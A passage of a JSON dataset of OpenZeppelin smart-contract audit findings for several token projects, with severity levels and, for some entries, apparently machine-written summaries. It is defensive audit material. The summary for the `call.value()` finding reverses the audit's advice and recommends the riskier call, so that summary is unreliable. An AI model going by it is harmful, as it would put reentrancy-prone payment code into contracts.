      "summary": "\nThis bug report is about an issue that occurs when the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) contract is deployed. The issue is that when tokens are burned, the `tokenSupply` defined in the token and the migration contract are not updated, causing invariants checks to fail. This can be exploited by any token holder as the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function is not restricted.\n\nThe suggested solution to this issue is to either restrict access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function solely to the [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) owner or to update the [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) variable after every [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) operation. The issue has been resolved by restricting access to the [`burn`](https://github.com/qiibee/qb-contracts/blob",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenAudit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11991",
      "title": "No Transfer event for mintedtokens",
      "impact": "LOW",
      "content": "It is recommended, [in the ERC20 spec](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md#transfer), to emit a `Transfer` event with the source (`_from`) set to `0x0` when minting new tokens. This enhances user experience by allowing applications such as [Etherscan](https://etherscan.io/) to learn of the new token holders. In this case this is only relevant for the constructor, where the initial balance is assigned to the contract creator. Nonetheless, consider emitting the corresponding event: `Transfer(0x0, msg.sender, _initialAmount)`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Everus TokenAudit",
      "source_link": "https://blog.openzeppelin.com/everus-token-audit-a05f0959534e/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11990",
      "title": "Unnecessary low levelcall",
      "impact": "LOW",
      "content": "The implementation of `approveAndCall` is using a low level `call` to invoke a function on another contract. A comment explains this is *so one doesnt have to include a contract in here just for this*. We would actually strongly recommend including the extra contract, and replacing the usage of `call` for a Solidity function call. Manually crafting the function signature is highly error prone, and on top of that, the arguments are not typechecked. Consider adding an abstract contract with the `receiveApproval` function declared, and using it to implement `approveAndCall`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Everus TokenAudit",
      "source_link": "https://blog.openzeppelin.com/everus-token-audit-a05f0959534e/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11997",
      "title": "Constructor parameter validation",
      "impact": "LOW",
      "content": "Consider performing sanity checks to validate `RCNCrowdsale`s [constructor parameters](https://github.com/ripio/rcn-token/blob/4bf441ae919f2580dcfeca59917b81bb30d2b856/contracts/RCNCrowdsale.sol#L43-L46). Check that `_fundingStartBlock &lt; _fundingEndBlock` and that the addresses `_ethFundDeposit` and `_rcnFundDeposit` are not `0x0`.\n\n\n***Update:** Fixed in [`70a42f2`](https://github.com/ripio/rcn-token/commit/70a42f2e209a4d556eb2be8c8dfc6cf2be468778)*.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Ripio TokenAudit",
      "source_link": "https://blog.openzeppelin.com/ripio-token-audit-abe43b887664/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11996",
      "title": "ERC20 compliance",
      "impact": "LOW",
      "content": "ERC20 specifies `decimals` to be a value of type `uint8`. It is [declared](https://github.com/ripio/rcn-token/blob/4bf441ae919f2580dcfeca59917b81bb30d2b856/contracts/RCNCrowdsale.sol#L15)as a `uint256` variable in `RCNCrowdsale`. Consider changing it to `uint8`. If so, it will be necessary to cast to `uint256` when using the variable for arithmetic such as when expressing token amounts as [`400 * 10**decimals`](https://github.com/ripio/rcn-token/blob/4bf441ae919f2580dcfeca59917b81bb30d2b856/contracts/RCNCrowdsale.sol#L29). Consider defining a state variable `TOKEN_UNIT = 10 ** uint256(decimals)` to write `400 * TOKEN_UNIT` in these cases.\n\n\nAdditionally, [treat transfers of zero tokens normally](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md#transfer), by returning `true` and emitting the `Transfer` event in both [`transfer`](https://github.com/ripio/rcn-token/blob/4bf441ae919f2580dcfeca59917b81bb30d2b856/contracts/StandardToken.sol#L18)and [`transferFrom`](https://github.com/ripio/rcn-token/blob/4bf441ae919f2580dcfeca59917b81bb30d2b856/contracts/StandardToken.sol#L29).\n\n\n***Update:** Fixed in [`0daf25a`](https://github.com/ripio/rcn-token/commit/0daf25a7aa83eda7da4d423793ee2cdabfa18d66)*.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Ripio TokenAudit",
      "source_link": "https://blog.openzeppelin.com/ripio-token-audit-abe43b887664/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11995",
      "title": "Using block numbers to specify start andend",
      "impact": "LOW",
      "content": "The crowdsale contract uses block numbers to specify [when it starts and when it ends](https://github.com/ripio/rcn-token/blob/4bf441ae919f2580dcfeca59917b81bb30d2b856/contracts/RCNCrowdsale.sol#L24-L25). The current recommendation is to use timestamps instead. The risk of miner manipulation of timestamps is very low for this use case, and due to the [Difficulty Bomb](https://etherscan.io/chart/blocktime)it is now very difficult to correctly estimate future block times. Consider switching to timestamps.\n\n\n***Update:** Fixed in [`50a51b7`](https://github.com/ripio/rcn-token/commit/50a51b75dc2928268ee205ed791359b859a7951e)*.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Ripio TokenAudit",
      "source_link": "https://blog.openzeppelin.com/ripio-token-audit-abe43b887664/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11994",
      "title": "Token metadata should be in tokencontract",
      "impact": "LOW",
      "content": "The public variables `name`, `symbol`, and `decimals` are [defined](https://github.com/ripio/rcn-token/blob/4bf441ae919f2580dcfeca59917b81bb30d2b856/contracts/RCNCrowdsale.sol#L13-L16)in the `RCNCrowdsale` contract. They should be defined in the token contract, as suggested by [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md). Define a new contract `RCNToken` inheriting from `MintableToken` and add the public variables there. Change [the crowdsale contract](https://github.com/ripio/rcn-token/blob/4bf441ae919f2580dcfeca59917b81bb30d2b856/contracts/RCNCrowdsale.sol#L47)to create an instance of `RCNToken` instead of `MintableToken`.\n\n\n***Update:** Fixed in [`be5255a`](https://github.com/ripio/rcn-token/commit/be5255a1a78d2a0256a3d07187fc22fba4bdf696)*.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Ripio TokenAudit",
      "source_link": "https://blog.openzeppelin.com/ripio-token-audit-abe43b887664/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11993",
      "title": "Use safemath",
      "impact": "MEDIUM",
      "content": "There are some unchecked math operations in the code (see [this](https://github.com/ripio/rcn-token/blob/4bf441ae919f2580dcfeca59917b81bb30d2b856/contracts/RCNCrowdsale.sol#L76)and [this](https://github.com/ripio/rcn-token/blob/4bf441ae919f2580dcfeca59917b81bb30d2b856/contracts/RCNCrowdsale.sol#L87), for example). Its always better to be safe and perform checked operations. Consider [using a safe math library](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.3.0/contracts/math/SafeMath.sol), or performing pre-condition checks on any math operation.\n\n\n***Update:** Fixed in [`1dc13ab`](https://github.com/ripio/rcn-token/commit/1dc13ab6f6563f2a8884031bbb2de2a5cdd1879b) and [`0daf25a`](https://github.com/ripio/rcn-token/commit/0daf25a7aa83eda7da4d423793ee2cdabfa18d66)*.",
      "summary": "\nThis bug report concerns the code in the Ripio Credit Network (RCN) token project. There are some math operations in the code that have not been checked, which can lead to errors. It is recommended to use a safe math library or to perform pre-condition checks on any math operation to prevent any problems. The issue has since been fixed in two commits, 1dc13ab and 0daf25a.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Ripio TokenAudit",
      "source_link": "https://blog.openzeppelin.com/ripio-token-audit-abe43b887664/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11992",
      "title": "Reuse open source contracts",
      "impact": "MEDIUM",
      "content": "The contracts `StandardToken`, `MintableToken` and parts of `RCNCrowdsale` are very similar to code found in [OpenZeppelins](https://openzeppelin.org/)`StandardToken`, `MintableToken` and `Crowdsale` contracts. Reimplementing functionality instead of reusing public and already audited code can bring [regression problems and difficult to find bugs](https://blog.zeppelin.solutions/hackergold-bug-analysis-68d893cad738). Consider removing the duplicate code from your repo and using the installed versions from OpenZeppelin.",
      "summary": "\nThis bug report is about the contracts `StandardToken`, `MintableToken` and parts of `RCNCrowdsale` which are very similar to the code found in OpenZeppelins `StandardToken`, `MintableToken` and `Crowdsale` contracts. Reimplementing functionality instead of reusing public and already audited code can lead to regression problems and difficult to find bugs. The bug report suggests to remove the duplicate code from the repo and use the installed versions from OpenZeppelin. \n\nThis is an important bug report to consider, as the use of public and already audited code can help to reduce the chances of regression problems and difficult to find bugs. By using the installed versions from OpenZeppelin, the chances of finding and solving bugs are much higher and the code is more secure. It is important to note that the bug report does not suggest to remove the code completely, but to replace it with the installed versions from OpenZeppelin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Ripio TokenAudit",
      "source_link": "https://blog.openzeppelin.com/ripio-token-audit-abe43b887664/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12156",
      "title": "Avoid namereuse",
      "impact": "LOW",
      "content": "The `constructor` and `founderSwitchRequest` function in PromissoryToken.sol use the name `_founderHash`, for two different semantic meanings. Using the same name for two different things is confusing and can bring unintended behaviors. Consider changing the function parameter name to `founderPassword` to differenciate its specific meaning.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Tokenaudit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12155",
      "title": "Bug Bounty",
      "impact": "LOW",
      "content": "Formal security audits are not enough to be safe. We recommend implementing [an automated contract-based bug bounty](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/Bounty.sol) and setting a period of time where security researchers from around the globe can try to break the tokens invariants. For more info on how to implement automated bug bounties with OpenZeppelin, [see this guide](https://github.com/OpenZeppelin/zeppelin-solidity#add-your-own-bounty-contract).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Tokenaudit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12154",
      "title": "Usage of magic constants",
      "impact": "LOW",
      "content": "There are several [magic constants](https://en.wikipedia.org/wiki/Magic_number_%28programming%29) in the contract code. Some examples are:\n\n\n* <https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L219>\n* <https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L276>\n* <https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/ConstitutionalDNA.sol#L233>\n* <https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/ConstitutionalDNA.sol#L228>\n\n\nUse of magic constants reduces code readability and makes it harder to understand code intention. We recommend extracting magic constants into contract constants.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Tokenaudit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12153",
      "title": "Use latest version ofSolidity",
      "impact": "MEDIUM",
      "content": "[Current code](https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L1) is written for old versions of solc (0.4.0). With [the latest storage overwriting vulnerability](https://blog.ethereum.org/2016/11/01/security-alert-solidity-variables-can-overwritten-storage/) found on versions of solc prior to 0.4.4, theres a risk this code can be compiled with vulnerable versions. We recommend changing the solidity version pragma for the latest version (`pragma solidity ^0.4.7;`) to enforce latest compiler version to be used.",
      "summary": "\nThis bug report is about an issue with the code in the Superdao-Seed-Stage1 repository. The code was written using an old version of the Solidity compiler (0.4.0) and is at risk of being compiled with a vulnerable version of the compiler due to the latest storage overwriting vulnerability. To address this, it is recommended that the Solidity version pragma be changed to the latest version (^0.4.7) to ensure that only the latest compiler version is used.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Tokenaudit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12152",
      "title": "Use safemath",
      "impact": "MEDIUM",
      "content": "There are many unchecked math operations in the code. Its always better to be safe and perform checked operations. Consider [using a safe math library](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/SafeMath.sol#L6), or performing pre-condition checks on any math operation.\n\n\nA particular attack on the PromissoryToken contract can be done by the founder when calling the function `setPrepaid`. [On line 161 of PromissoryToken.sol](https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L161), the check can be skipped if a big enough `_tokenAmount` is chosen by the founder.",
      "summary": "\nThis bug report is about unchecked math operations in the PromissoryToken contract code. It is recommended to use a safe math library or perform pre-condition checks on any math operation to prevent attacks from occurring. Specifically, on line 161 of the PromissoryToken.sol, a check can be skipped if a large enough token amount is chosen by the founder. To avoid this, it is important to use a safe math library or perform pre-condition checks on any math operation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Tokenaudit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12151",
      "title": "Use ofsend",
      "impact": "HIGH",
      "content": "Use of `send` is always risky and should be analyzed in detail. One occurrence found in [line 291 of PromissoryToken.sol](https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L291).  \n\n [Always check send return value](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#c528): OK.  \n\n [Consider calling send at the end of the function](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#3d17): OK.  \n\n [Favor pull payments over push payments](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#fa61): Severe problem.\n\n\nIf there is more than one destination in a withdrawal proposal, one of the destination addresses can prevent all others from getting the funds. If one of the destination addresses throws in the fallback function, the whole `approveWithdraw`function call will fail, causing all payments to fail. This gives control to any malicious payee to block payments to all other payees.\n\n\nFor more info on this problem, [see this note](https://github.com/ConsenSys/Ethereum-Development-Best-Practices/wiki/Fallback-functions-and-the-fundamental-limitations-of-using-send%28%29-in-Ethereum-&-Solidity#abuse).",
      "summary": "\nThe bug report is about the use of the `send` function in the PromissoryToken.sol contract. When there is more than one destination in a withdrawal proposal, one of the destination addresses can prevent all others from getting the funds. If one of the destination addresses throws in the fallback function, the whole `approveWithdraw`function call will fail, causing all payments to fail. This gives control to any malicious payee to block payments to all other payees.\n\nThe report states that the use of `send` is always risky and should be analyzed in detail. It recommends that the return value of the `send` function should always be checked, that the `send` function should be called at the end of the function, and that pull payments should be favored over push payments.\n\nThe bug report is important because it highlights the risks of using the `send` function and provides recommendations on how to mitigate these risks. It is important for beginners to be aware of the potential security risks associated with the `send` function and to follow best practices when using it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Tokenaudit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12150",
      "title": "Use of passwords as function authentication mechanisms",
      "impact": "HIGH",
      "content": "The use of `founderHash`, `privatePhrase` and `_oneTimesharedPhrase` as an authentication mechanism does not add any security. Even non-public variables can be read by anyone from the blockchain, and anyone can check transaction data to recover parameter values. Checks using `founderHash`, `privatePhrase` and `_oneTimesharedPhrase` are useless and can thus be removed with an equivalent result.\n\n\nConsider switching to `msg.sender`-based authentication as used [here](https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L101).",
      "summary": "\nThis bug report is about an authentication mechanism used in a blockchain. It states that the use of `founderHash`, `privatePhrase` and `_oneTimesharedPhrase` as an authentication mechanism does not add any security. This is because these variables can be read by anyone from the blockchain, and anyone can check the transaction data to recover the parameter values. Therefore, the checks using these variables are useless and can be removed with an equivalent result.\n\nThe bug report suggests switching to `msg.sender`-based authentication as used in a certain github repository. This authentication mechanism is based on the sender of a message, which is more secure than the existing one.\n\nOverall, this bug report is about an authentication mechanism used in a blockchain that is not secure. It suggests switching to `msg.sender`-based authentication as an alternative, which is more secure.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Tokenaudit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12188",
      "title": "Avoid namereuse",
      "impact": "LOW",
      "content": "The **sendTokens** function in TokenVesting.sol reuses the name `vestAmount`, which is also a contract public variable. Using the same name for two different things is confusing and can bring unintended behaviors.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) tokenaudit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12187",
      "title": "Tests should be independent",
      "impact": "LOW",
      "content": "Some tests depend on each other. This makes testing specific functions in isolation more difficult. We recommend [making each test independent](http://softwareengineering.stackexchange.com/a/64308) by using a new token contract for each test case, instead of using the same token instance for every test.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) tokenaudit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12186",
      "title": "Remove commented code",
      "impact": "LOW",
      "content": "Commented code just adds clutter for the reader and creates unncessary confusion. Remove [the commented `allocateBountyAndEcosystemTokens` function](https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L296-L308). (edit: fixed by ArcadeCity team)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) tokenaudit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12185",
      "title": "Remove duplicate code",
      "impact": "LOW",
      "content": "Duplicate code makes it harder to understand the codes intention and thus, auditing the code correctly. It also increases the risk of introducing hidden bugs when modifying one of the copies of some code and not the others. We recommend the following to remove duplicate code:\n\n\n* Extract **StandardToken**, **SafeMath** and **Token** code into separate files, and import them from main contract files, instead of having exact copies of each in every file. We recommend using [OpenZeppelins implementation of StandardToken](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/StandardToken.sol).\n* `price` and `testPrice` functions repeat the same code. `price` could do`return testPrice(block.number);`. (edit: fixed by ArcadeCity team)\n* `msg.sender` checks for authentication repeat the same patterns in many functions. Examples are [this](https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L261), [this](https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L318) and [this](https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L339). We recommend extracting those to function modifiers.\n* `buy` function seems redundant to the fallback function for **ARCToken.sol**. (edit: fixed by ArcadeCity team)\n* [The lines calculating allocations](https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L267-L268) have the same code duplicated to arrive at the allocation amount. We recommend calculating the amount first and then updating **balances** and **totalSupply**.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) tokenaudit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12184",
      "title": "Remove unnecessary code",
      "impact": "LOW",
      "content": "The `uint public presaleEtherRaised` variable seems to be unnecessary. Consider using [**multisig.balance**](http://solidity.readthedocs.io/en/develop/units-and-global-variables.html#address-related) in its place unless funds in the multisig address will be moved (and thus balance changed) before `endBlock`. Having unneeded extra variables and code increases risk and attack surface for contracts invariants to be broken.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) tokenaudit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12183",
      "title": "Usage of magic constants",
      "impact": "LOW",
      "content": "There are several [magic constants](https://en.wikipedia.org/wiki/Magic_number_%28programming%29) in the contract code. Some examples are:\n\n\n* <https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L188-L199>\n* <https://github.com/ArcadeCity/ac-token/blob/dd4207e1538f96eb3cbbf9e714eb38015bfe7c5a/contracts/ARCToken.sol#L267-L276>\n\n\nUse of magic constants reduces code readability and makes it harder to understand code intention. We recommend extracting magic constants into contract constants.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) tokenaudit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12182",
      "title": "Price function is notlinear",
      "impact": "MEDIUM",
      "content": "The code seems to intend a linear price function, but this is the actual behavior:\n\n\n![](https://i0.wp.com/miro.medium.com/max/2132/1*xgysx4pqSfVkwYcYLnZLfQ.png?w=840&ssl=1)\nThere is an initial period where 1 ether = 125 ARC, and then four steps of decreasing price. We recommend reviewing if the price curve meets the desired shape.",
      "summary": "\nThis bug report is about a code that is intended to produce a linear price function, but instead produces a price curve with four steps of decreasing price. The initial period of the curve has 1 ether equal to 125 ARC. It is recommended that the code be reviewed to ensure that the price curve meets the desired shape.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) tokenaudit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12181",
      "title": "Remove unneeded call.value()",
      "impact": "MEDIUM",
      "content": "Using `call.value()` [is potentially dangerous, and was responsible for the TheDAO hack](https://ethereum.stackexchange.com/questions/6391/what-does-call-value-mean-and-how-did-it-allow-the-attack-to-the-dao). We couldnt find a reason to use `multisig.call.value(msg.value)` instead of the simpler`multisig.send(msg.value)`. We recommend making this change. (edit: fixed by ArcadeCity team)",
      "summary": "\nThis bug report discusses the potential danger of using `call.value()` and how it was responsible for the TheDAO hack. It is recommended to use `multisig.call.value(msg.value)` instead of `multisig.send(msg.value)` for safety. The ArcadeCity team has already fixed this issue. \n\nTheDAO hack occurred in June 2016 and was caused by a vulnerability in the code of the DAO smart contract. This vulnerability allowed an attacker to gain access to the funds of the DAO and drain them from the system. The exploit used was called the recursive call attack, which was enabled by the use of the `call.value()` function. \n\n`Call.value()` is a function that allows a contract to send Ether to another contract, while also transferring the msg.value (the amount of Ether sent with the transaction) to the called contract. This function is potentially dangerous as it can be used to create recursive calls, which can be used to gain access to the funds of the contract.\n\nThe bug report recommends using the `multisig.call.value(msg.value)` instead of the simpler `multisig.send(msg.value)` to avoid potential danger. The ArcadeCity team has already fixed this issue. \n\nIn conclusion, the bug report discusses the potential danger of using `call.value()` and how it was responsible for the TheDAO hack. It is recommended to use `multisig.call.value(msg.value)` instead of `multisig.send(msg.value)` for safety, and the ArcadeCity team has already fixed this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) tokenaudit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12180",
      "title": "Use latest version ofSolidity",
      "impact": "MEDIUM",
      "content": "Current code is written for old versions of solc. While this is not a security problem, its recommended to use latest version of Solidity for any new contract. Using old versions of Solidity also has some consequences that bring potential security problems. For example, all functions can have `msg.value &gt; 0`, which can cause the balance of the contract to be non-zero (which doesnt seem to be desired, based on the `multisig` forwarding account).\n\n\nWe recommend:\n\n\n* Adding `pragma solidity ^0.4.2;` to the top of each contract file. (edit: fixed by ArcadeCity team)\n* Adding `payable` function modifier to the fallback function andthe `buyRecipient` function. These are the only functions that need to be able to handle incoming payments.",
      "summary": "\nThis bug report is about the current code written for old versions of solc. This code may lead to potential security problems and is not recommended for any new contracts. To address this issue, it is necessary to add the pragma solidity ^0.4.2; to the top of each contract file and the payable function modifier to the fallback function and the buyRecipient function. This will enable them to handle incoming payments. The ArcadeCity team have already fixed this issue. It is important to use the latest version of Solidity to avoid any security risks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) tokenaudit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12179",
      "title": "General codequality",
      "impact": "MEDIUM",
      "content": "Code quality of the ac-token project is low, which made auditing it hard. We recommend a refactor to improve code quality (more recommendations given next), and maybe doing a second security audit. Simpler code makes functionality more apparent and reduces attack surface. Given the high degree of test coverage, making changes to improve code quality will have a very low risk of introducing regressions.",
      "summary": "\nThe ac-token project has been found to have low code quality, making it difficult to audit. To improve the code quality, a refactor is recommended. This will make the functionality easier to understand and reduce the attack surface. As the test coverage of the project is already high, there is a low risk of introducing regressions when making changes. Additionally, it is suggested to do a second security audit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Arcade City (ARC) tokenaudit",
      "source_link": "https://blog.openzeppelin.com/arcade-city-arc-token-audit-9071fa55a4e8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    }
  ]
}